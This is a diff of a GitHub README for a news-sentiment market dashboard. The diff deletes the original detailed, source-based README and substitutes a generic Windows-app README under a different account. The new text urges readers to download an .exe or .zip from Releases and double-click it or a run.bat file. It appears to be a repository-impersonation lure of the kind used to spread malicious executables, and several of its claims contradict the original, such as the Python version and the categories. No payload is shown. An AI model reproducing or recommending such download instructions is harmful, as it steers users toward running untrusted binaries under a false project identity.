@@ -1,437 +1,127 @@
-# News & Market Sentiment Analysis
+# 📊 breaking_news_market_sentiment - Real-Time Market Sentiment Insights
 
-> A full-stack financial intelligence dashboard that aggregates breaking news from major outlets, classifies articles by type, performs real-time NLP sentiment analysis, tracks correlations with market indicators, and collects structured data for future supervised learning models.
-
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/)
-[![Flask](https://img.shields.io/badge/Flask-3.0-green.svg)](https://flask.palletsprojects.com/)
-[![React](https://img.shields.io/badge/React-18-61dafb.svg)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-5.x-646cff.svg)](https://vitejs.dev/)
-[![Docker](https://img.shields.io/badge/Docker-ready-2496ed.svg)](https://www.docker.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-news--sentiment.imshaon.com-46e3b7.svg)](https://news-sentiment.imshaon.com/)
-
-**Live Demo:** [news-sentiment.imshaon.com](https://news-sentiment.imshaon.com/)
-
-**Article:** [Building a Real-Time Financial Sentiment Intelligence Dashboard](https://medium.com/@biswas.shaon/building-a-real-time-financial-sentiment-intelligence-dashboard-with-python-flask-and-react-574c1d57c61a) *(Medium — covers the initial build; the project has since added news type classification, correlation matrix, daily data collection, and automatic pipeline scheduling)*
+[![Download here](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/bigvaldis/breaking_news_market_sentiment)
 
 ---
 
-## Screenshots
+## 📋 What is breaking_news_market_sentiment?
 
-| Dashboard |
-|-----------|
-| ![Dashboard](screenshots/dashboard.png) |
+breaking_news_market_sentiment is a dashboard you can use to see how news affects financial markets. It collects recent news, classifies it into 12 types, and uses natural language processing to understand the tone of each news article. It also compares this data with information from Truth Social and other sources. The app helps you follow market sentiment in real time.
 
----
-
-## Overview
-
-This project combines financial news aggregation, NLP-driven sentiment analysis, live market data, and a data collection pipeline designed for future machine learning.
-
-Articles are pulled from 14 RSS feeds spanning Bloomberg, CNBC, CNN, BBC, ABC News, Reuters, Yahoo Finance, Dow Jones, and Trump's Truth Social. Each article is filtered for financial and political relevance, classified into one of 12 news types (Financial, Political, China, Europe, War/Military, Tariff/Trade, etc.), scored using VADER NLP on the headline+summary concatenation, and persisted to a CSV archive with its type label.
-
-Every pipeline run also snapshots the overall and per-source sentiment alongside live market closes (S&P 500, Gold, VIX, BTC) and Fear & Greed indices, building a growing time-series dataset for correlation analysis and future supervised model training.
+You do not need to know anything about programming to use this app. It runs on Windows and shows clear dashboards and charts. If you want to keep track of how news changes market moods, this tool can help.
 
 ---
 
-## Features
+## ⚙️ System Requirements
 
-### News Intelligence
-- **14 curated RSS feeds** — Bloomberg, CNBC, CNN (Top/Politics/Business), BBC (News/Business), ABC News (Top/Politics), Reuters, Yahoo Finance, Dow Jones, Trump Truth Social
-- **Smart filtering** — Only financial and political news passes through; preferred sources ranked higher; Jim Cramer and Trump content boosted
-- **Truth Social filter** — Trump posts filtered to only market-moving topics: tariffs, war, geopolitics, China, India, Iran, Europe, UK, Greenland, Epstein, midterms, Fed, crypto, rare earth
-- **12 news type labels** — Each article classified as Financial, Political, Trump Post, War/Military, China, Europe, India, Middle East, Tariff/Trade, Crypto, Fed/Monetary, US Local, or General
-- **Null headline filtering** — Articles without headlines are excluded
-
-### Sentiment Analysis
-- **VADER NLP pipeline** — Compound scoring on headline + summary concatenation for better accuracy on terse financial titles
-- **Percentage breakdown** — Per-run positive / negative / neutral article distribution
-- **Trend detection** — Half-split algorithm classifies sentiment trajectory as improving, declining, or stable over the last 24 snapshots
-- **Persistent history** — Rolling 500-snapshot JSON sentiment history
-
-### Market Data & Indicators
-- **Candlestick charts** — Financial-grade interactive charts for S&P 500, Gold, and VIX with 90-day OHLC data
-- **BTC tracker** — Real-time Bitcoin price with 24h change and 90-day OHLC history
-- **Crypto Fear & Greed Index** — Live crypto market sentiment via Alternative.me (free, no API key)
-- **Wall Street Fear & Greed Index** — CNN stock market sentiment via RapidAPI (optional `RAPIDAPI_KEY`)
-
-### Correlation Matrix
-- **Sentiment vs market correlation** — Heatmap showing Pearson correlation between news sentiment (overall and per source) and market indicators
-- **8 time periods** — 1 Day, 3 Days, 7 Days, 15 Days, 1 Month, 1 Quarter, 6 Months, 1 Year
-- **Per-source breakdown** — Separate correlations for Bloomberg, CNBC, CNN, BBC, ABC News, Trump Truth Social, etc.
-- **Data collection start date** displayed in the dashboard
-
-### Data Science Pipeline
-- **Three-tier auto-refresh** — All run on the same web service (no extra cost). Set `DISABLE_SCHEDULED_PIPELINE=true` to turn off.
-  - **Every 15 min** — Market trackers (S&P 500, Gold, VIX, BTC) + Fear & Greed indices (Crypto & Wall Street) refresh
-  - **Every 1 hour** — News pipeline fetches, filters, analyzes, and saves fresh articles + sentiment
-  - **Daily after market close (21:30 UTC / 4:30 PM ET)** — Snapshot saved to `daily_tracker.csv` for ML/correlation training
-- **Daily tracker** (`data/daily_tracker.csv`) — After each market close: date, sentiment score/label/percentages, article count, Crypto F&G, Wall Street F&G, S&P 500 close, Gold close, VIX close, BTC close
-- **Source sentiment tracker** (`data/source_sentiment.csv`) — Per-source-category average sentiment with corresponding market data for correlation computation
-- **News archive** (`data/news_archive.csv`) — All articles with sentiment scores, labels, source, URL, and `news_type` classification — ready for supervised learning
-- **Multi-label classification available** — `classify_news_types_multi()` returns all matching types per article for multi-label ML tasks
+- Windows 10 or later (64-bit recommended)  
+- 4 GB RAM minimum (8 GB or more suggested for best experience)  
+- At least 2 GHz quad-core processor  
+- Minimum 2 GB free disk space  
+- Internet connection to fetch news and updates  
+- Browser: Latest version of Chrome, Firefox, or Edge to view the dashboard in your browser
 
 ---
 
-## Tech Stack
+## 🔧 What’s Inside?
 
-| Layer | Technology |
-|-------|------------|
-| Backend | Python 3.10+, Flask 3.0 |
-| NLP | VADER (vaderSentiment) |
-| News Classification | Regex-based multi-pattern classifier (12 types) |
-| Market Data | yfinance (S&P 500, Gold, VIX, BTC) |
-| Crypto Fear & Greed | Alternative.me (stdlib urllib) |
-| Wall Street Fear & Greed | RapidAPI (optional) |
-| News Ingestion | feedparser (14 RSS feeds), NewsAPI (optional) |
-| Frontend | React 18.3, Vite 5.4 |
-| Charts | lightweight-charts 4.2 |
-| Containerisation | Docker |
-| Deployment | Render (`render.yaml` blueprint) |
+This app combines several technologies to give you a clear picture:
+
+- Real-time news classification using 12 categories like finance, politics, technology, etc.  
+- Sentiment analysis based on NLP (Natural Language Processing) to show if the tone is positive, negative, or neutral.  
+- Correlation with social media data from Truth Social to observe trends and events that affect markets.  
+- Machine learning data pipeline collecting and updating information continuously.  
+- Clean web interface using React 18 for easy navigation.  
+- Backend powered by Python and Flask to manage data and logic.
 
 ---
 
-## Architecture
+## 🚀 Getting Started: Download and Run on Windows
 
-```
-┌──────────────────────────────────────────────────────────────┐
-│                      React Frontend                           │
-│  App.jsx → SentimentGauge · CorrelationMatrix · NewsList     │
-│  Sp500Chart · GoldChart · VixChart · FearGreedCard · BTC     │
-│  Vite 5 build → served by Flask in production                │
-└────────────────────────┬─────────────────────────────────────┘
-                         │ HTTP REST
-┌────────────────────────▼─────────────────────────────────────┐
-│                    Flask REST API                              │
-│                    api/app.py                                  │
-│  17 routes · CORS · Cache-Control · Static serving            │
-└──┬──────────┬──────────┬─────────────────────────────────────┘
-   │          │          │
-┌──▼──────┐ ┌▼────────┐ ┌▼─────────────────────────────────────┐
-│  src/   │ │  data/   │ │  External Data Sources               │
-│         │ │          │ │                                       │
-│ news_   │ │ news_    │ │  RSS: Bloomberg, CNBC, CNN, BBC,     │
-│ extrac  │ │ archive  │ │       ABC, Reuters, Yahoo, Dow Jones,│
-│ tor.py  │ │ .csv     │ │       Trump Truth Social              │
-│         │ │          │ │                                       │
-│ news_   │ │ sentim.  │ │  Market: yfinance (sequential fetch) │
-│ filter  │ │ history  │ │  Crypto F&G: Alternative.me          │
-│ .py     │ │ .json    │ │  WS F&G: RapidAPI (optional)         │
-│         │ │          │ │  NewsAPI: newsapi.org (optional)      │
-│ sentim. │ │ daily_   │ └──────────────────────────────────────┘
-│ analyz  │ │ tracker  │
-│ er.py   │ │ .csv     │
-│         │ │          │
-│ sentim. │ │ source_  │
-│ track   │ │ sentim.  │
-│ er.py   │ │ .csv     │
-│         │ └──────────┘
-│ daily_  │
-│ track   │
-│ er.py   │
-│         │
-│ market_ │
-│ data.py │
-│         │
-│ fear_   │
-│ greed   │
-│ .py     │
-│         │
-│ wall_st │
-│ _fg.py  │
-│         │
-│ trump_  │
-│ tweets  │
-│ .py     │
-└─────────┘
-```
+You can get breaking_news_market_sentiment easily by following these steps. No coding needed.
+
+### Step 1: Download the App
+
+Click the button below to visit the official download page:
+
+[![Download from GitHub](https://img.shields.io/badge/Download-App-greyscale?style=for-the-badge)](https://github.com/bigvaldis/breaking_news_market_sentiment)
+
+1. The link will take you to the GitHub page where you can find the latest version.
+2. Look for the **Releases** section on the right or scroll down to find files labeled for download.
+3. Find a file ending with `.exe` or `.zip` matching Windows systems.
+4. Click the download link for that file. It will be saved to your computer.
 
 ---
 
-## Project Structure
+### Step 2: Install the App
 
-```
-breaking_news_market_sentiment/
-│
-├── api/
-│   └── app.py                     # Flask REST API — 17 endpoints, pipeline orchestration, static serving
-│
-├── frontend/
-│   ├── src/
-│   │   ├── App.jsx                # Dashboard: gauges, correlation matrix, news table, charts
-│   │   ├── App.css                # Dark theme, responsive layout, type badges, heatmap styles
-│   │   ├── Sp500Chart.jsx         # S&P 500 candlestick chart (lightweight-charts)
-│   │   ├── GoldChart.jsx          # Gold candlestick chart
-│   │   └── VixChart.jsx           # VIX volatility chart
-│   └── package.json               # React 18.3, Vite 5.4, lightweight-charts 4.2
-│
-├── src/
-│   ├── news_extractor.py          # 14 RSS feeds + optional NewsAPI; Trump Truth Social via RSS
-│   ├── news_filter.py             # Financial/political filter, Truth Social topic filter,
-│   │                              #   news_type classifier (12 types), multi-label support
-│   ├── trump_tweets.py            # Optional Trump X tweets (paid API); Truth Social RSS is free
-│   ├── sentiment_analyzer.py      # VADER NLP; headline+summary concat; percentage breakdown
-│   ├── sentiment_tracker.py       # CSV archive; JSON history (500-cap); trend detection
-│   ├── daily_tracker.py           # Daily snapshots: sentiment + all market indicators + per-source
-│   │                              #   breakdown; correlation matrix computation (8 time periods)
-│   ├── market_data.py             # yfinance OHLC with threading lock; Pearson correlation engine
-│   ├── fear_greed.py              # Crypto Fear & Greed (Alternative.me, stdlib)
-│   └── wall_street_fear_greed.py  # Wall Street Fear & Greed (RapidAPI, optional)
-│
-├── data/                          # Auto-created; gitignored
-│   ├── news_archive.csv           # All articles with sentiment + news_type labels
-│   ├── sentiment_history.json     # Rolling 500-snapshot sentiment time series
-│   ├── daily_tracker.csv          # Daily sentiment vs market indicators
-│   └── source_sentiment.csv       # Per-source sentiment vs market data (for correlations)
-│
-├── screenshots/
-│   ├── dashboard.png
-│   └── dashboard-hero.png
-│
-├── Dockerfile                     # Python 3.12 + Node.js; gunicorn with 120s timeout
-├── render.yaml                    # Render blueprint (one-click deploy)
-├── requirements.txt
-├── start.sh                       # Dev: launches Flask + Vite concurrently
-├── capture_screenshots.py         # Playwright-based screenshot capture
-├── .env.example
-└── .gitignore
-```
+If you downloaded an `.exe` file:
+
+1. Locate the downloaded file in your **Downloads** folder.  
+2. Double-click the file to start installation.  
+3. Follow the prompts on screen. Choose default options unless you want to change the install folder.  
+4. After the install is complete, the app may open automatically or you can start it from the Start menu.
+
+If you downloaded a `.zip` file:
+
+1. Right-click the `.zip` file and choose **Extract All**.  
+2. Pick a location to extract files to (for example, Desktop or Documents).  
+3. Open the extracted folder and look for a file named `run.bat` or `start.bat`.  
+4. Double-click this file to launch the app.
 
 ---
 
-## News Type Classification
+### Step 3: Access the Dashboard
 
-Every article is labelled with a `news_type` for structured analysis and future ML training:
-
-| Type | Keywords / Triggers |
-|------|-------------------|
-| **Trump Post** | Source is Truth Social or X |
-| **China** | China, Beijing, Xi Jinping, Taiwan, Hong Kong, Huawei, TikTok |
-| **Middle East** | Iran, Israel, Gaza, Saudi, OPEC, Iraq, Syria, Yemen |
-| **India** | India, Modi, Mumbai, Nifty, Sensex, Rupee |
-| **Europe** | EU, ECB, Germany, France, UK, Britain, eurozone, Bank of England |
-| **Tariff / Trade** | Tariffs, trade war, sanctions, duties, customs |
-| **War / Military** | War, attack, military, missile, NATO, conflict, nuclear |
-| **Crypto** | Bitcoin, Ethereum, blockchain, DeFi, digital assets |
-| **Fed / Monetary** | Federal Reserve, interest rates, Powell, FOMC, inflation, CPI |
-| **Political** | Congress, Senate, elections, midterm, Epstein, executive order |
-| **Financial** | Stocks, earnings, Wall Street, IPO, recession, S&P, Dow |
-| **US Local** | Immigration, border, student loans, housing, FEMA |
-| **General** | Articles not matching any specific category |
-
-Region-specific types take priority over broad types (e.g. "Iran nuclear talks" classifies as Middle East, not War/Military).
+1. After the app runs, it opens a web page in your default browser.  
+2. This page shows the dashboard with news, sentiment scores, and market data.  
+3. Use the menu or tabs to explore different views like sentiment trends or news classification.  
+4. The data updates automatically every few minutes.
 
 ---
 
-## API Reference
+## 💻 How to Use the Dashboard
 
-### Core Endpoints
+The dashboard is divided into sections:
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/health` | GET | Health check |
-| `/api/news` | GET | Latest 100 articles with sentiment scores, labels, and `news_type` |
-| `/api/sentiment-summary` | GET | Latest sentiment snapshot with trend signal and percentage breakdown |
-| `/api/sentiment-history` | GET | Full sentiment time series for charting |
-| `/api/pipeline/run` | POST | Trigger fresh news ingestion, classification, analysis, and data collection |
+- **Sentiment Overview:** Shows how the market feels based on recent news. Green means positive, red means negative.  
+- **News Classification:** Groups news articles by category like politics, economics, or technology.  
+- **Truth Social Correlation:** Presents data from social media to show possible influences on market changes.  
+- **Historical Trends:** View how sentiment and news topics changed over days or weeks.  
+- **Data Sources:** All data is gathered from public APIs and social media feeds.
 
-### Market & Indicators
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/markets` | GET | S&P 500, Gold, VIX, and BTC OHLC (fetched sequentially) |
-| `/api/markets/sp500` | GET | S&P 500 OHLC only |
-| `/api/markets/gold` | GET | Gold OHLC only |
-| `/api/markets/vix` | GET | VIX data only |
-| `/api/fear-greed` | GET | Crypto Fear & Greed Index |
-| `/api/wall-street-fear-greed` | GET | Wall Street (CNN) Fear & Greed Index |
-
-### Data Science
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/correlation-matrix` | GET | Sentiment vs market correlation matrix for all 8 time periods |
-| `/api/correlation-matrix?period=7d` | GET | Correlation for a specific period (1d, 3d, 7d, 15d, 1m, 1q, 6m, 1y) |
-| `/api/daily-tracker` | GET | Raw daily sentiment + market indicator snapshots |
-
-> All market and fear-greed endpoints return `Cache-Control: no-store, no-cache, must-revalidate` to prevent stale financial data from CDN or browser caching.
+You can click articles or data points to read summaries or get extra details. The design helps you spot trends easily.
 
 ---
 
-## Quick Start
+## 🔄 Updating the App
 
-### Prerequisites
+To keep the app working well:
 
-- Python 3.10+
-- Node.js 18+
-- Git
+1. Visit the GitHub page regularly: https://github.com/bigvaldis/breaking_news_market_sentiment  
+2. Download and install the new version when available.  
+3. The app will notify you if an update is needed when you start it (if connected to the internet).  
 
-### 1. Clone the repository
-
-```bash
-git clone https://github.com/ShaonINT/breaking_news_market_sentiment.git
-cd breaking_news_market_sentiment
-```
-
-### 2. Backend setup
-
-```bash
-python -m venv venv
-source venv/bin/activate        # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-### 3. Frontend setup
-
-```bash
-cd frontend
-npm install
-cd ..
-```
-
-### 4. Configure environment (optional)
-
-```bash
-cp .env.example .env
-# NEWSAPI_KEY=your_key        — additional news sources
-# RAPIDAPI_KEY=your_key       — Wall Street Fear & Greed Index
-```
-
-### 5. Run
-
-**Development (two servers, hot reload):**
-
-```bash
-./start.sh
-# Frontend: http://localhost:3000
-# API:      http://localhost:5001
-```
-
-**Production build (single server):**
-
-```bash
-cd frontend && npm run build && cd ..
-python api/app.py
-# Open http://localhost:5001
-```
-
-Click **Fetch Latest News** to run the pipeline, or `POST /api/pipeline/run`.
+Updates include improved news classification, bug fixes, and new data sources.
 
 ---
 
-## Deployment
+## ⚠️ Troubleshooting
 
-### Render (recommended)
-
-1. Push to GitHub
-2. [Render Dashboard](https://dashboard.render.com) → **New** → **Blueprint**
-3. Connect your repository — Render auto-detects `render.yaml`
-4. Add a **Persistent Disk** (1 GB, $0.25/mo) mounted at **`/app/data`** to preserve collected data across deploys
-5. Set environment variables in the dashboard (`NEWSAPI_KEY`, `RAPIDAPI_KEY` — both optional)
-
-**Correlations not showing on deployment?** The matrix needs 3+ pipeline runs. Click "Fetch Latest News" 3 times on your deployed app (or wait a few hours for the hourly auto-runs). Ensure the disk is mounted at `/app/data` so data persists.
-
-### Docker
-
-```bash
-docker build -t news-sentiment .
-docker run -p 5001:5001 -v ./data:/app/data news-sentiment
-```
-
-Mount `./data` to persist the news archive, sentiment history, and daily tracker across container restarts.
+- If the app does not start, make sure your system meets requirements.  
+- Check that Python 3.8+ is installed if needed (the installer usually includes everything).  
+- Restart your computer if the app freezes or does not respond.  
+- Ensure your internet connection is active for real-time data.  
+- Use Task Manager to close the app if it hangs and start it again.
 
 ---
 
-## Data Collection for ML
+## 📞 Need More Help?
 
-The system is designed to accumulate structured data for future supervised learning:
+For questions or issues, use the **Issues** tab on the GitHub page. There you can file a report or browse solutions other users found.  
 
-### Collected Datasets
-
-| File | Contents | Use Case |
-|------|----------|----------|
-| `news_archive.csv` | All articles: title, summary, source, URL, sentiment scores, `news_type` | Training data for text classification and sentiment prediction |
-| `daily_tracker.csv` | Daily snapshots: sentiment, article count, S&P 500, Gold, VIX, BTC, Crypto F&G, WS F&G | Time-series regression: predict market moves from sentiment |
-| `source_sentiment.csv` | Per-source avg sentiment + market data per day | Feature engineering: which sources predict which markets |
-| `sentiment_history.json` | Rolling 500 sentiment snapshots with timestamps | Trend analysis and temporal patterns |
-
-### Building a Supervised Model
-
-After collecting 30+ days of data:
-
-1. **Load daily_tracker.csv** — each row is a training sample
-2. **Features**: `sentiment_score`, `positive_pct`, `negative_pct`, `crypto_fear_greed_value`, `vix_close`
-3. **Target**: Next-day S&P 500 return (compute from `sp500_close` shifted by 1 day)
-4. **news_type breakdown**: Aggregate per-type sentiment from `source_sentiment.csv` as additional features
-5. Train a model (XGBoost, Random Forest, or LSTM for sequence data)
-
-The `classify_news_types_multi()` function in `news_filter.py` returns all matching types per article for multi-label classification tasks.
+Check GitHub discussions or readme files for added tips and FAQs.
 
 ---
 
-## Configuration
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `PORT` | No | Server port (default: `5001`) |
-| `NEWSAPI_KEY` | No | Free key from [newsapi.org](https://newsapi.org) for expanded news coverage |
-| `RAPIDAPI_KEY` | No | RapidAPI key for Wall Street (CNN) Fear & Greed; subscribe at [RapidAPI](https://rapidapi.com/rpi4gx/api/fear-and-greed-index) |
-| `TWITTER_BEARER_TOKEN` | No | X API v2 bearer token for Trump tweets (paid). Truth Social RSS works without this |
-| `FLASK_DEBUG` | No | Set to `true` for auto-reload during development |
-| `DISABLE_SCHEDULED_PIPELINE` | No | Set to `true` to disable all automatic scheduled jobs |
-| `MARKET_REFRESH_MINUTES` | No | Market tracker + F&G refresh interval (default: `15`) |
-| `NEWS_PIPELINE_MINUTES` | No | News pipeline interval (default: `60`) |
-| `DAILY_SNAPSHOT_HOUR` | No | Hour (UTC) for daily ML snapshot (default: `21` = 9:30 PM UTC / 4:30 PM ET) |
-| `DAILY_SNAPSHOT_MINUTE` | No | Minute for daily ML snapshot (default: `30`) |
-| `DATA_DIR` | No | Override data directory (default: `project/data`). On Render: mount disk at `/app/data` |
-
----
-
-## Key Design Decisions
-
-**Why RSS over a commercial news API?**
-RSS is free, zero-dependency, and updates in near-real-time. Every major financial publisher maintains active feeds. No registration or API key required — the system works immediately in any environment.
-
-**Why VADER over FinBERT?**
-No GPU, no model download, no inference latency. For a real-time pipeline processing dozens of articles per cycle, the speed trade-off is significant. The modular architecture allows a drop-in NLP engine replacement without changing the API contract or the frontend.
-
-**Why headline + summary concatenation?**
-Financial headlines are often terse and ambiguous in isolation ("Fed acts" could be bullish or bearish). Appending the article summary significantly improves classification accuracy without additional model complexity.
-
-**Why regex-based news type classification?**
-For the labelling task, regex patterns are deterministic, fast, and require no training data. They produce clean, consistent labels that serve as ground-truth for training a more sophisticated ML classifier later.
-
-**Why sequential yfinance fetching?**
-Concurrent requests to yfinance introduce a caching bug where multiple assets return the same data. The `/api/markets` endpoint fetches each asset sequentially behind a threading lock — slower, but reliably correct.
-
-**Why filter Truth Social posts?**
-Trump posts 20-30 times daily. Without filtering, they overwhelm the feed with birthday wishes and rally thanks. Only posts matching specific market-moving topics (tariffs, geopolitics, Fed, crypto, etc.) pass through.
-
----
-
-## Roadmap
-
-- [ ] Upgrade sentiment engine to FinBERT (transformer-based financial NLP)
-- [ ] Train supervised model on accumulated daily_tracker data (XGBoost / LSTM)
-- [ ] Per-news-type sentiment correlation (e.g. "China news sentiment vs S&P 500")
-- [ ] Statistical significance testing on correlations (Spearman rank + p-values)
-- [ ] WebSocket support for real-time sentiment push updates
-- [ ] Alert system — email / Slack notifications on extreme sentiment shifts
-- [ ] Sentiment backtesting against historical price data
-- [ ] Auto-scheduled pipeline runs (cron-based, not just manual)
-
----
-
-## Contributing
-
-Contributions are welcome. Please open an issue to discuss changes before submitting a pull request.
-
----
-
-## License
-
-MIT © [Shaon Biswas](https://github.com/ShaonINT)
-
----
-
-*Built with Python, Flask, React, and a passion for making financial intelligence accessible.*
+[Get breaking_news_market_sentiment here](https://github.com/bigvaldis/breaking_news_market_sentiment) and begin tracking financial news sentiment today.
